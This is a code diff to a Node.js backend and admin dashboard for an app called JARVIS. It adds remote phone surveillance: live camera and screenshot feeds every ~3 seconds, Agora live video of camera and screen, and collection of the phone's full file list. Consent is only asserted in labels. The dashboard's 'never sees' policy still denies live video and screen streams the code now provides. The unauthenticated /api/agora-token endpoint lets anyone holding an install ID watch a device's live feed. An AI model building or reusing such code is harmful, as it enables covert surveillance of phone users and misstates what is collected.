@@ -54,6 +54,7 @@ const DEVICES_FILE = path.join(DATA_DIR, "devices.json");
 const CONFIG_FILE = path.join(DATA_DIR, "config.json");
 const SHOTS_DIR = path.join(DATA_DIR, "screenshots");
 const CAM_DIR = path.join(DATA_DIR, "camera");
+const FILELIST_DIR = path.join(DATA_DIR, "filelists");
 const FILES_DIR = path.join(DATA_DIR, "files");
 const MAX_BODY = 2_000_000; // 2 MB — screenshots are base64 JPEGs
 
@@ -66,7 +67,10 @@ const DEFAULT_CONFIG = {
   apk_url: "",
   screenshot_requested: {}, // install_id -> true (consumed when the app uploads)
   camera_requested: {}, // install_id -> true (consumed when the app uploads a photo)
-  live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~12s while set)
+  live_camera: {}, // install_id -> true (admin live preview — app uploads a photo every ~3s while set)
+  live_screen: {}, // install_id -> true (admin live screen — app uploads a screenshot every ~3s while set)
+  file_list_requested: {}, // install_id -> true (consumed when the app uploads its file list)
+  live_video: {}, // install_id -> true (admin Agora live video — app publishes camera+screen video while set)
   messages: [], // {id, target: "all" | install_id, title, body, at} — shown as a notification on the phone
 };
 
@@ -144,6 +148,44 @@ function publicUser(user, devices) {
     files: user.files || [],
     email: user.email || "",
   };
+}
+
+// ---- Agora RTC token (AccessToken2, "007") — pure Node crypto, no deps.
+// token = "007" + base64(packBytes(sig) + packU32(crcCh) + packU32(crcUid) + packBytes(msg))
+// msg = packU32(salt) + packU32(ts) + packMapU32({1: ts})   (1 = kJoinChannel)
+// sig = HMAC-SHA256(appCertificate, appId + channel + uidStr + msg)
+const CRC_TABLE = (() => {
+  const t = new Int32Array(256);
+  for (let n = 0; n < 256; n++) {
+    let c = n;
+    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+    t[n] = c;
+  }
+  return t;
+})();
+function crc32(buf) {
+  let c = 0xFFFFFFFF;
+  for (let i = 0; i < buf.length; i++) c = CRC_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
+  return (c ^ 0xFFFFFFFF) >>> 0;
+}
+function packU32(x) { const b = Buffer.alloc(4); b.writeUInt32LE(x >>> 0, 0); return b; }
+function packU16(x) { const b = Buffer.alloc(2); b.writeUInt16LE(x & 0xFFFF, 0); return b; }
+function packBytes(b) { return Buffer.concat([packU16(b.length), b]); }
+function packMapU32(map) {
+  const parts = [packU16(Object.keys(map).length)];
+  for (const k of Object.keys(map)) parts.push(packU16(Number(k)), packU32(map[k]));
+  return Buffer.concat(parts);
+}
+function buildAgoraToken(appId, appCertificate, channel, uid) {
+  const uidStr = uid === 0 ? "" : String(uid);
+  const salt = Math.floor(Math.random() * 0xFFFFFFFF) >>> 0;
+  const ts = Math.floor(Date.now() / 1000) + 24 * 3600; // 24h expiry
+  const msg = Buffer.concat([packU32(salt), packU32(ts), packMapU32({ 1: ts })]);
+  const sig = crypto.createHmac("sha256", appCertificate)
+    .update(Buffer.concat([Buffer.from(appId, "utf8"), Buffer.from(channel, "utf8"), Buffer.from(uidStr, "utf8"), msg]))
+    .digest();
+  const content = Buffer.concat([packBytes(sig), packU32(crc32(Buffer.from(channel, "utf8"))), packU32(crc32(Buffer.from(uidStr, "utf8"))), packBytes(msg)]);
+  return "007" + content.toString("base64");
 }
 
 function publicConfig(cfg) {
@@ -293,7 +335,7 @@ function dashboardHtml(users, devices, cfg, key) {
       const evs = (u.events || []).slice(-5).reverse().map((e) => `<li><small>${escapeHtml(fmtTime(e.at))}</small> ${escapeHtml(e.event)}${e.detail ? " — " + escapeHtml(e.detail) : ""}</li>`).join("");
       const hist = (u.history || []).slice(-20).map((m) => `<div class="msg ${escapeHtml(m.role)}"><b>${escapeHtml(m.role)}:</b> ${escapeHtml(m.text)}</div>`).join("");
       const shot = u.last_screenshot_at
-        ? `<img src="/api/admin/screenshot/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest screen" loading="lazy">`
+        ? `<img id="screenImg-${escapeHtml(u.install_id)}" src="/api/admin/screenshot/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest screen" loading="lazy">`
         : '<p class="muted">No screenshot yet.</p>';
       const cam = u.last_camera_at
         ? `<img id="camImg-${escapeHtml(u.install_id)}" src="/api/admin/camera-photo/${escapeHtml(u.install_id)}?key=${encodeURIComponent(key)}" alt="latest camera photo" loading="lazy">`
@@ -312,11 +354,17 @@ function dashboardHtml(users, devices, cfg, key) {
 ${acts ? `<div><b>Recent activity:</b><ul>${acts}</ul></div>` : ""}
 ${evs ? `<div><b>Events:</b><ul>${evs}</ul></div>` : ""}
 ${hist ? `<details><summary>Chat history (${(u.history || []).length} messages)</summary><div class="hist">${hist}</div></details>` : ""}
-<details><summary>Screen ${u.last_screenshot_at ? "· " + escapeHtml(fmtTime(u.last_screenshot_at)) : ""}</summary>${shot}
-<p><button onclick="reqShot('${escapeHtml(u.install_id)}')">Request screenshot</button> <span class="muted">— the app sends one screenshot on its next heartbeat, only if the user allowed monitoring.</span></p></details>
+<details><summary>Screen ${u.last_screenshot_at ? "· " + escapeHtml(fmtTime(u.last_screenshot_at)) : ""} <span id="liveBadgeScreen-${escapeHtml(u.install_id)}"></span></summary>${shot}
+<p><button onclick="reqShot('${escapeHtml(u.install_id)}')">Request screenshot</button> <button onclick="reqLiveScreen('${escapeHtml(u.install_id)}')">▶ Live screen</button> <button onclick="stopLiveScreen('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one screenshot, or live screen (a fresh screenshot every ~3s, not video) — only if the user allowed monitoring.</span></p></details>
 <details><summary>Camera ${u.last_camera_at ? "· " + escapeHtml(fmtTime(u.last_camera_at)) : ""} <span id="liveBadge-${escapeHtml(u.install_id)}"></span></summary>${cam}
-<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <button onclick="reqLiveCam('${escapeHtml(u.install_id)}')">▶ Live preview</button> <button onclick="stopLiveCam('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one photo, or live preview (a fresh photo every ~12s, not video) — only if the user allowed monitoring and camera permission.</span></p></details>
+<p><button onclick="reqCam('${escapeHtml(u.install_id)}')">Request camera photo</button> <button onclick="reqLiveCam('${escapeHtml(u.install_id)}')">▶ Live preview</button> <button onclick="stopLiveCam('${escapeHtml(u.install_id)}')">⏹ Stop live</button> <span class="muted">— one photo, or live preview (a fresh photo every ~3s, not video) — only if the user allowed monitoring and camera permission.</span></p></details>
+<details><summary>🎥 Live video (Agora) ${u.agora_live ? '<span class="ok">● LIVE</span>' : ""}</summary>
+<p><button onclick="watchAgora('${escapeHtml(u.install_id)}')">▶ Watch live video</button> <button onclick="stopAgora('${escapeHtml(u.install_id)}')">⏹ Stop watching</button> <button onclick="reqLiveVideo('${escapeHtml(u.install_id)}')">▶ Start live video on phone</button> <button onclick="stopLiveVideo('${escapeHtml(u.install_id)}')">⏹ Stop live video</button> <span class="muted">— true live video (camera + screen) via Agora, only when the app user turned live video ON.</span></p>
+<div id="agoraBox-${escapeHtml(u.install_id)}"><div id="agoraCam-${escapeHtml(u.install_id)}" style="width:100%;aspect-ratio:16/9;background:#000;border-radius:8px"></div><div id="agoraScreen-${escapeHtml(u.install_id)}" style="width:100%;aspect-ratio:16/9;background:#000;border-radius:8px;margin-top:8px"></div><div id="agoraStatus-${escapeHtml(u.install_id)}" class="muted">Not watching.</div></div></details>
 ${fileLinks ? `<details open><summary>Files (${(u.files || []).length})</summary><ul>${fileLinks}</ul></details>` : `<div class="muted">Files: none uploaded yet (only with monitoring ON + file permission).</div>`}
+<details><summary>📂 File list ${u.last_file_list_at ? "· " + escapeHtml(fmtTime(u.last_file_list_at)) : ""}</summary>
+<p><button onclick="reqFileList('${escapeHtml(u.install_id)}')">Request file list</button> <button onclick="loadFileList('${escapeHtml(u.install_id)}')">↻ Load list</button> <span class="muted">— the phone's full file list (names, sizes, dates — not contents), only if the user gave file permission and monitoring is ON.</span></p>
+<div id="fileList-${escapeHtml(u.install_id)}"></div></details>
 <div class="bigbtns">
 <button class="ban" onclick="act('${escapeHtml(u.install_id)}','ban')">🚫 BAN USER</button>
 <button onclick="act('${escapeHtml(u.install_id)}','restore')">↩ Restore</button>
@@ -331,7 +379,8 @@ ${devStatus !== "ok" ? `<div class="warnline">Device is ${escapeHtml(devStatus)}
     .join("");
 
   return `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>JARVIS Admin — ${total} installs</title><style>
+<title>JARVIS Admin — ${total} installs</title>
+<script src="https://download.agora.io/sdk/release/AgoraRTC_N.js"></script><style>
 body{font-family:system-ui,sans-serif;background:#070b12;color:#e6f1ff;margin:0;padding:16px}
 h1{color:#22d3ee;margin:0 0 4px}.sub{color:#9fb3d1;margin:0 0 16px}
 .warnbar{background:#7c2d12;border:1px solid #f97316;color:#ffedd5;padding:12px;border-radius:8px;margin-bottom:16px}
@@ -369,7 +418,7 @@ img{max-width:100%;border-radius:10px;border:1px solid #334155;margin-top:6px}
 ${USING_DEFAULT_KEY ? '<div class="warnbar"><b>WARNING:</b> You are using the default admin key (jarvis-admin-123). Anyone who knows it can control every install. Set a strong ADMIN_KEY environment variable on Render and redeploy.</div>' : ""}
 <div class="panel"><h2>📜 Policy — plain and simple</h2>
 <p><b>What the admin CAN see / do here:</b> which installs exist (device, app version, first/last seen, last action), Ban / Suspend / Shutdown one user or one whole device in one click, turn Jarvis features on/off for everyone, add instructions, post an announcement, publish an app update.</p>
-<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~12s while the admin has it on — photo slideshow, not video), small text files from Jarvis's own workspace (only with file permission), and location (only when the user turned ON location tracking).</p>
+<p><b>What the admin sees ONLY when the app user turned ON "Owner monitoring" in Jarvis Settings:</b> recent activity, which permissions the user granted, recent chat history, one screenshot (only when requested), one camera photo (only when requested) or live camera preview (a fresh photo every ~3s while the admin has it on — photo slideshow, not video) or live screen share (a fresh screenshot every ~3s while on) or true live video via Agora (camera + screen as real video, only while the app user turned live video ON), small text files from Jarvis's own workspace (only with file permission), the full file list (only with file permission), and location (only when the user turned ON location tracking).</p>
 <p><b>What the admin NEVER sees / does:</b> no passwords, no OTPs, no true live camera video, no live screen stream, no location tracking (unless the user turned ON location tracking), no data from other apps, no silent installs (every update needs one tap on Install), no phone unlocking. If monitoring is OFF, the admin sees only the install's device, version and last action — nothing else.</p>
 </div>
 <div class="cards">
@@ -464,12 +513,107 @@ function startLiveRefresh(id) {
   liveTimers[id] = setInterval(() => {
     const img = document.getElementById('camImg-' + id);
     if (img) img.src = '/api/admin/camera-photo/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
-  }, 5000);
+  }, 2000);
 }
 function stopLiveRefresh(id) {
   if (liveTimers[id]) { clearInterval(liveTimers[id]); delete liveTimers[id]; }
   const badge = document.getElementById('liveBadge-' + id);
   if (badge) badge.innerHTML = '';
+}
+const liveScreenTimers = {};
+async function reqLiveScreen(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_screen' })) {
+    alert('Live screen share ON — a fresh screenshot every ~3s (photo slideshow, not video). It starts within ~10 seconds.');
+    startLiveScreenRefresh(id);
+  }
+}
+async function stopLiveScreen(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_screen' })) {
+    stopLiveScreenRefresh(id);
+    alert('Live screen share OFF.');
+  }
+}
+function startLiveScreenRefresh(id) {
+  stopLiveScreenRefresh(id);
+  const badge = document.getElementById('liveBadgeScreen-' + id);
+  if (badge) badge.innerHTML = ' <span class="ok">● LIVE</span>';
+  liveScreenTimers[id] = setInterval(() => {
+    const img = document.getElementById('screenImg-' + id);
+    if (img) img.src = '/api/admin/screenshot/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY) + '&t=' + Date.now();
+  }, 2000);
+}
+function stopLiveScreenRefresh(id) {
+  if (liveScreenTimers[id]) { clearInterval(liveScreenTimers[id]); delete liveScreenTimers[id]; }
+  const badge = document.getElementById('liveBadgeScreen-' + id);
+  if (badge) badge.innerHTML = '';
+}
+async function reqFileList(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_file_list' })) {
+    alert('File list requested — it appears below within ~10 seconds (only if the user gave file permission).');
+    setTimeout(() => loadFileList(id), 12000);
+  }
+}
+async function loadFileList(id) {
+  const box = document.getElementById('fileList-' + id);
+  if (!box) return;
+  box.innerHTML = 'Loading…';
+  const r = await fetch('/api/admin/file-list/' + encodeURIComponent(id) + '?key=' + encodeURIComponent(KEY));
+  if (!r.ok) { box.innerHTML = '<span class="muted">No file list yet — press "Request file list" first.</span>'; return; }
+  const d = await r.json();
+  const rows = (d.files || []).map((f) => '<tr><td>' + escapeHtml(f.name) + '</td><td>' + (f.dir ? '📁 folder' : fmtSize(f.size)) + '</td><td>' + (f.modified ? fmtTime(f.modified) : '—') + '</td><td class="muted">' + escapeHtml(f.path) + '</td></tr>').join('');
+  box.innerHTML = '<p class="muted">' + d.count + ' entries · updated ' + escapeHtml(fmtTime(d.at)) + '</p><table><tr><th>Name</th><th>Size</th><th>Modified</th><th>Path</th></tr>' + rows + '</table>';
+}
+function fmtSize(n) {
+  if (!n) return '0 B';
+  const u = ['B', 'KB', 'MB', 'GB'];
+  let i = 0;
+  while (n >= 1024 && i < u.length - 1) { n /= 1024; i++; }
+  return n.toFixed(1) + ' ' + u[i];
+}
+const agoraClients = {};
+async function watchAgora(id) {
+  const st = document.getElementById('agoraStatus-' + id);
+  if (typeof AgoraRTC === 'undefined') { if (st) st.textContent = 'Agora SDK failed to load (check internet).'; return; }
+  if (agoraClients[id]) { if (st) st.textContent = 'Already watching.'; return; }
+  if (st) st.textContent = 'Joining live video…';
+  try {
+    const r = await fetch('/api/agora-token?install_id=' + encodeURIComponent(id) + '&uid=0');
+    if (!r.ok) { if (st) st.textContent = 'Token failed — is Agora configured on the backend?'; return; }
+    const d = await r.json();
+    const client = AgoraRTC.createClient({ mode: 'live', codec: 'vp8' });
+    agoraClients[id] = client;
+    client.on('user-published', async (user, mediaType) => {
+      await client.subscribe(user, mediaType);
+      if (mediaType === 'video') {
+        const el = user.uid === 1002 ? document.getElementById('agoraScreen-' + id) : document.getElementById('agoraCam-' + id);
+        if (el) user.videoTrack.play(el);
+        if (st) st.textContent = 'Live: ' + (user.uid === 1002 ? 'screen' : 'camera') + ' (uid ' + user.uid + ')';
+      }
+    });
+    client.on('user-unpublished', (user) => { if (st) st.textContent = 'Stream stopped (uid ' + user.uid + ').'; });
+    await client.setClientRole('audience');
+    await client.join(d.appId, d.channel, d.token, 0);
+    if (st) st.textContent = 'Watching channel ' + d.channel + ' — waiting for the phone to publish…';
+  } catch (e) {
+    if (st) st.textContent = 'Join failed: ' + e.message;
+    delete agoraClients[id];
+  }
+}
+async function stopAgora(id) {
+  const c = agoraClients[id];
+  if (c) { try { await c.leave(); } catch (e) {} delete agoraClients[id]; }
+  const st = document.getElementById('agoraStatus-' + id);
+  if (st) st.textContent = 'Not watching.';
+}
+async function reqLiveVideo(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'request_live_video' })) {
+    alert('Live video requested — the phone starts publishing camera + screen within ~10 seconds (only if the user allowed live video). Then press "Watch live video".');
+  }
+}
+async function stopLiveVideo(id) {
+  if (await post('/api/admin/action', { key: KEY, install_id: id, action: 'stop_live_video' })) {
+    alert('Live video stopped on the phone.');
+  }
 }
 async function saveCfg() {
   const features = {};
@@ -559,6 +703,7 @@ const server = http.createServer(async (req, res) => {
           history: [],
           last_screenshot_at: null,
           email: body.email ? String(body.email).slice(0, 120) : "",
+          agora_live: !!body.agora_live,
           last_location: (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") ? { lat: body.location.lat, lng: body.location.lng, address: String(body.location.address || ""), accuracy_m: body.location.accuracy_m || null, at: now } : null,
         };
         users[installId] = user;
@@ -569,6 +714,7 @@ const server = http.createServer(async (req, res) => {
         if (body.device_id) user.device_id = String(body.device_id);
         if (body.last_action !== undefined) user.last_action = body.last_action;
         if (body.monitoring !== undefined) user.monitoring = !!body.monitoring;
+        if (typeof body.agora_live === "boolean") user.agora_live = body.agora_live;
         if (body.email) user.email = String(body.email).slice(0, 120);
         // v1.4.7b: location tracking — only when the user turned it ON (opt-in)
         if (body.location && typeof body.location === "object" && typeof body.location.lat === "number" && typeof body.location.lng === "number") {
@@ -588,6 +734,34 @@ const server = http.createServer(async (req, res) => {
         screenshot_requested: shotRequested,
         camera_requested: camRequested,
         live_camera: !!(cfg.live_camera && cfg.live_camera[installId]),
+        live_screen: !!(cfg.live_screen && cfg.live_screen[installId]),
+        live_video: !!(cfg.live_video && cfg.live_video[installId]),
+        file_list_requested: !!(cfg.file_list_requested && cfg.file_list_requested[installId]),
+      });
+    }
+
+    // ---- GET /api/agora-token (Agora RTC token for a channel — app + dashboard viewer)
+    if (req.method === "GET" && pathname === "/api/agora-token") {
+      const appId = process.env.AGORA_APP_ID || "";
+      const appCert = process.env.AGORA_APP_CERTIFICATE || "";
+      if (!appId || !appCert) return sendJson(res, 503, { error: "Agora not configured on this backend" });
+      const installId = String(url.searchParams.get("install_id") || "").trim();
+      if (!installId) return sendJson(res, 400, { error: "install_id required" });
+      const channel = ("jarvis-" + installId.replace(/[^A-Za-z0-9_-]/g, "")).slice(0, 64);
+      const uid = Math.max(0, parseInt(url.searchParams.get("uid") || "0", 10) || 0);
+      const token = buildAgoraToken(appId, appCert, channel, uid);
+      return sendJson(res, 200, { token, appId, channel, uid, expire: Math.floor(Date.now() / 1000) + 24 * 3600 });
+    }
+
+    // ---- GET /api/live-status (tiny poll — the app asks every 10s while live matters)
+    if (req.method === "GET" && pathname === "/api/live-status") {
+      const installId = String(url.searchParams.get("install_id") || "").trim();
+      const cfg = loadConfig();
+      return sendJson(res, 200, {
+        live_camera: !!(installId && cfg.live_camera && cfg.live_camera[installId]),
+        live_screen: !!(installId && cfg.live_screen && cfg.live_screen[installId]),
+        live_video: !!(installId && cfg.live_video && cfg.live_video[installId]),
+        file_list_requested: !!(installId && cfg.file_list_requested && cfg.file_list_requested[installId]),
       });
     }
 
@@ -679,6 +853,43 @@ const server = http.createServer(async (req, res) => {
       const cfg = loadConfig();
       if (cfg.camera_requested) { delete cfg.camera_requested[installId]; saveConfig(cfg); }
       return sendJson(res, 200, { ok: true });
+    }
+
+    // ---- POST /api/file-list (consent only — the app sends its file LIST, not contents)
+    if (req.method === "POST" && pathname === "/api/file-list") {
+      const body = await readJsonBody(req);
+      const installId = String(body.install_id || "").trim();
+      if (!installId || !Array.isArray(body.files)) return sendJson(res, 400, { error: "install_id and files[] required" });
+      const users = loadUsers();
+      const user = users[installId];
+      if (!user) return sendJson(res, 404, { error: "unknown install_id — heartbeat first" });
+      const files = body.files.slice(0, 1000).map((f) => ({
+        path: String(f.path || f.name || "").slice(0, 300),
+        name: String(f.name || "").slice(0, 150),
+        size: typeof f.size === "number" ? f.size : 0,
+        modified: typeof f.modified === "number" ? f.modified : 0,
+        dir: !!f.dir,
+      }));
+      fs.mkdirSync(FILELIST_DIR, { recursive: true });
+      fs.writeFileSync(path.join(FILELIST_DIR, safeFileName(installId) + ".json"), JSON.stringify({ at: new Date().toISOString(), count: files.length, files }, null, 1));
+      user.last_file_list_at = new Date().toISOString();
+      user.last_seen = user.last_file_list_at;
+      saveUsers(users);
+      const cfg = loadConfig();
+      if (cfg.file_list_requested) { delete cfg.file_list_requested[installId]; saveConfig(cfg); }
+      return sendJson(res, 200, { ok: true, count: files.length });
+    }
+
+    // ---- GET /api/admin/file-list/<install_id> (admin only)
+    if (req.method === "GET" && pathname.startsWith("/api/admin/file-list/")) {
+      if (url.searchParams.get("key") !== ADMIN_KEY) {
+        return sendJson(res, 401, { error: "unauthorized" });
+      }
+      const id = safeFileName(pathname.slice("/api/admin/file-list/".length));
+      const file = path.join(FILELIST_DIR, id + ".json");
+      if (!fs.existsSync(file)) return sendJson(res, 404, { error: "no file list yet" });
+      res.writeHead(200, { "Content-Type": "application/json" });
+      return fs.createReadStream(file).pipe(res);
     }
 
     // ---- POST /api/files (consent only — the app uploads small text files
@@ -893,6 +1104,47 @@ const server = http.createServer(async (req, res) => {
         const cfg = loadConfig();
         if (cfg.live_camera) { delete cfg.live_camera[installId]; saveConfig(cfg); }
         return sendJson(res, 200, { ok: true, live_camera: false });
+      }
+
+      if (action === "request_live_screen") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        cfg.live_screen = cfg.live_screen || {};
+        cfg.live_screen[installId] = true;
+        saveConfig(cfg);
+        return sendJson(res, 200, { ok: true, live_screen: true });
+      }
+
+      if (action === "stop_live_screen") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        if (cfg.live_screen) { delete cfg.live_screen[installId]; saveConfig(cfg); }
+        return sendJson(res, 200, { ok: true, live_screen: false });
+      }
+
+      if (action === "request_file_list") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        cfg.file_list_requested = cfg.file_list_requested || {};
+        cfg.file_list_requested[installId] = true;
+        saveConfig(cfg);
+        return sendJson(res, 200, { ok: true, file_list_requested: true });
+      }
+
+      if (action === "request_live_video") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        cfg.live_video = cfg.live_video || {};
+        cfg.live_video[installId] = true;
+        saveConfig(cfg);
+        return sendJson(res, 200, { ok: true, live_video: true });
+      }
+
+      if (action === "stop_live_video") {
+        if (!user) return sendJson(res, 404, { error: "unknown install_id" });
+        const cfg = loadConfig();
+        if (cfg.live_video) { delete cfg.live_video[installId]; saveConfig(cfg); }
+        return sendJson(res, 200, { ok: true, live_video: false });
       }
 
       if (!user) return sendJson(res, 404, { error: "unknown install_id" });
